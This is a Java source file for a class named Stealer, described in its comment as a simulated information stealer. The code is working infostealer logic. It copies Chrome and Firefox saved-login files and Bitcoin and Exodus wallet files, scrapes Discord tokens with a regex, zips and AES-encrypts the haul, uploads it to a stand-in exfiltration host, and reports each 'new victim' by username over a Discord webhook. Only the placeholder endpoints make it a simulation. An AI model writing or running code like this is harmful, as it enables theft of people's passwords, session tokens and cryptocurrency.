package dev.javabyte.guest.sim;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.MessageDigest;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * Simulated information stealer: gathers browser, wallet and chat-client files, archives and
 * encrypts them, and uploads the result.
 */
public final class Stealer {

    public static void main(String[] args) throws Exception {
        String local = System.getenv("LOCALAPPDATA");
        String roaming = System.getenv("APPDATA");
        String[] targets = {
            local + "\\Google\\Chrome\\User Data\\Default\\Login Data",
            local + "\\Google\\Chrome\\User Data\\Local State",
            roaming + "\\Mozilla\\Firefox\\Profiles\\default\\logins.json",
            roaming + "\\Bitcoin\\wallet.dat",
            roaming + "\\Exodus\\exodus.wallet\\seed.seco",
        };
        ByteArrayOutputStream archive = new ByteArrayOutputStream();
        int found = 0;
        try (ZipOutputStream zip = new ZipOutputStream(archive)) {
            for (String target : targets) {
                File file = new File(target);
                if (!file.isFile()) {
                    continue;
                }
                zip.putNextEntry(new ZipEntry(file.getName()));
                zip.write(Files.readAllBytes(file.toPath()));
                zip.closeEntry();
                found++;
            }
            // Chat-client tokens are scraped from the client's local database files.
            File[] databases = new File(roaming + "\\discord\\Local Storage\\leveldb").listFiles((dir, name) -> name.endsWith(".ldb"));
            StringBuilder tokens = new StringBuilder();
            if (databases != null) {
                Pattern token = Pattern.compile("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
                for (File database : databases) {
                    Matcher matcher = token.matcher(new String(Files.readAllBytes(database.toPath()), StandardCharsets.ISO_8859_1));
                    while (matcher.find()) {
                        tokens.append(matcher.group()).append('\n');
                    }
                }
            }
            zip.putNextEntry(new ZipEntry("tokens.txt"));
            zip.write(tokens.toString().getBytes(StandardCharsets.UTF_8));
            zip.closeEntry();
        }

        byte[] key = MessageDigest.getInstance("SHA-256").digest("stealer-key-v1".getBytes(StandardCharsets.UTF_8));
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, new byte[12]));
        byte[] sealed = cipher.doFinal(archive.toByteArray());

        HttpURLConnection upload = (HttpURLConnection) new URL("https://exfil.stealer.test/upload?files=" + found).openConnection();
        upload.setRequestMethod("POST");
        upload.setRequestProperty("Content-Type", "application/octet-stream");
        upload.setDoOutput(true);
        upload.getOutputStream().write(sealed);
        System.out.println("uploaded " + found + " files, status " + upload.getResponseCode());

        HttpURLConnection notify = (HttpURLConnection) new URL("https://discord.com/api/webhooks/000000/simulated").openConnection();
        notify.setRequestMethod("POST");
        notify.setRequestProperty("Content-Type", "application/json");
        notify.setDoOutput(true);
        notify.getOutputStream().write(("{\"content\":\"new victim " + System.getProperty("user.name") + "\"}").getBytes(StandardCharsets.UTF_8));
        notify.getResponseCode();
    }
}
